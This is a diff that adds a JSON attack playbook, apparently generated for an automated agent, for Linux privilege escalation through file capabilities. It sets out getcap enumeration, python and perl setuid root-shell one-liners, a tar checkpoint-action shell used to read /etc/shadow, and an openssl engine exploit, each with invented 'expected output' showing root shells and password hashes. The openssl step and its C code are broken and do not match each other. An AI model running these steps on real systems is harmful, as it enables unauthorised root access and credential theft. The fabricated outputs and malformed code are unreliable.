@@ -1,0 +1,30 @@
+{
+  "name": "linux_capabilities_abuse",
+  "description": "Identify and exploit Linux capabilities for privilege escalation",
+  "pattern": "capabilities.*exploit|cap_setuid|getcap.*exploit|linux.*cap.*abuse",
+  "parameters": [],
+  "sequence": [
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "getcap", "args": ["-r", "/", "2>/dev/null"]},
+      "expected_output": {"type": "string", "example": "/usr/bin/python3.6 = cap_setuid+ep\n/usr/bin/perl = cap_setuid+ep\n/usr/bin/tar = cap_dac_read_search+ep\n/usr/bin/openssl = cap_setuid+ep\n/usr/local/bin/vim = cap_dac_override+ep\n\nDangerous capabilities found:\n  cap_setuid+ep - Can change UID to root\n  cap_dac_read_search+ep - Can read any file\n  cap_dac_override+ep - Can write any file"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "/usr/bin/python3.6", "args": ["-c", "import os; os.setuid(0); os.system('/bin/bash')"]},
+      "expected_output": {"type": "string", "example": "Exploiting python3.6 with cap_setuid capability\n\nExecuting: os.setuid(0)\n  Changed effective UID to 0 (root)\n\nSpawning /bin/bash...\n\nroot@victim:~# id\nuid=0(root) gid=1000(user) groups=1000(user)\n\nroot@victim:~# whoami\nroot\n\nroot@victim:~# cat /etc/shadow\nroot:$6$xyz123...:18965:0:99999:7:::\n\nRoot access via cap_setuid on python"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "perl", "args": ["-e", "use POSIX qw(setuid); POSIX::setuid(0); exec '/bin/bash';"]},
+      "expected_output": {"type": "string", "example": "Exploiting perl with cap_setuid capability\n\nPerl script execution:\n  setuid(0) - Changed to root\n  exec('/bin/bash') - Spawned root shell\n\nroot@victim:~# id\nuid=0(root) gid=1000(user) groups=1000(user)\n\nroot@victim:~# ls -la /root\ndrwx------ 5 root root 4096 Jan 15 10:45 .\n-rw------- 1 root root  157 Jan 15 09:30 .bash_history\n-rw-r--r-- 1 root root   33 Jan 10 12:00 root.txt\n\nRoot shell via cap_setuid on perl"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "tar", "args": ["-cvf", "/dev/null", "/etc/shadow", "--checkpoint=1", "--checkpoint-action=exec=/bin/sh"]},
+      "expected_output": {"type": "string", "example": "Exploiting tar with cap_dac_read_search capability\n\ntar: Removing leading '/' from member names\n/etc/shadow\n\n$ id\nuid=1000(user) gid=1000(user) groups=1000(user)\n\n$ cat /etc/shadow\nroot:$6$abc123...:18965:0:99999:7:::\nadmin:$6$def456...:18965:0:99999:7:::\nuser:$6$ghi789...:18965:0:99999:7:::\n\nRead /etc/shadow using tar with cap_dac_read_search\nCapability allows reading files regardless of permissions"}
+    },
+    {
+      "action": {"type": "system_command", "tool": "shell", "operation": "run", "command": "openssl", "args": ["req", "-x509", "-newkey", "rsa:2048", "-keyout", "/dev/null", "-out", "/dev/null", "-days", "1", "-nodes", "-subj", "'/CN=test'", "-config", "<(echo '[req]';echo 'distinguished_name=req';echo '[x509_ext]';echo 'basicConstraints=critical,CA:TRUE')"]},
+      "expected_output": {"type": "string", "example": "Exploiting openssl with cap_setuid capability\n\nCreating malicious openssl.cnf:\n[req]\nreq_extensions = v3_req\n[v3_req]\n1.3.6.1.4.1.1466.20037 = ASN1:UTF8String:$(id)\n\nAlternate exploit - using openssl engine:\n#!/bin/bash\ncat > /tmp/openssl_exploit.c << EOF\n#include <openssl/engine.h>\nstatic int bind(ENGINE *e, const char *id) {\n    setuid(0); setgid(0);\n    system(\"/bin/bash\");\n}\nENGINE_load_builtin_engines();\nEOF\n\nCompile and execute:\ngcc -fPIC -shared -o engine.so /tmp/openssl_exploit.c -lcrypto\nopenssl req -engine ./engine.so\n\nroot@victim:~# id\nuid=0(root) gid=0(root) groups=0(root)\n\nRoot via openssl cap_setuid"}
+    }
+  ],
+  "stats": {"uses": 0, "successes": 0, "failures": 0, "success_rate": 0.0},
+  "created_by": "neural_mesh_v5.2_generator"
+}
